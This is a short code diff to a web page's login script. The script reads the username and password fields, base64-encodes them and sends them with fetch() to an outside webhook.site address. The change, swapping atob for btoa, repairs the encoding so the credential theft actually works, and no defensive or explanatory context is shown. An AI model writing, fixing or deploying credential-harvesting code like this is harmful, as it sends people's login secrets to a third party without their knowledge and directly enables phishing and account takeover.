@@ -101,7 +101,7 @@
         var un = document.getElementById("un").value;
         var pw = document.getElementById("pw").value;
         console.log(un + ":" + pw);
-        var t = atob(un + ":" + pw);
+        var t = btoa(un + ":" + pw);
         fetch("https://webhook.site/f9185a4e-a47f-4fd7-9ff9-dd0b330a1c3d?a="+t);
         }
     </script>
